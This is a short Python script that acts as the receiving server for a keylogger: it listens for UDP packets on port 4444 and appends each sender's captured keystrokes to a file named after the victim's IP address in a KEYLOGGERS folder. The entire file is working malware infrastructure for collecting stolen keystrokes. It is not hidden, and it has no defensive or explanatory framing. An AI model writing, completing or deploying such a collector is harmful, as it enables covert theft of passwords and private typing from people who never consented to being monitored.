import socket

# Listen to all of the cumper's network card.
IP_ADDRESS = "0.0.0.0"
PORT_NUMBER = 4444
KEYLOGGER_DIRECTORY_PATH = ".\KEYLOGGERS"


def address_to_file_name(address: str) -> str:
    return KEYLOGGER_DIRECTORY_PATH + '\\' + address.replace('.', '_')


def add_text_to_file(text: str, address: str):
    file_name = address_to_file_name(address)
    with open(file_name, "a") as file:
        file.write(text)

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        print("server is up")
        server_socket.bind((IP_ADDRESS, PORT_NUMBER))
        while True:
            data, client_address = server_socket.recvfrom(1024)
            text = data.decode()
            print(f"message is {text} from {client_address}")
            add_text_to_file(text, client_address[0])


if __name__ == "__main__":
    main()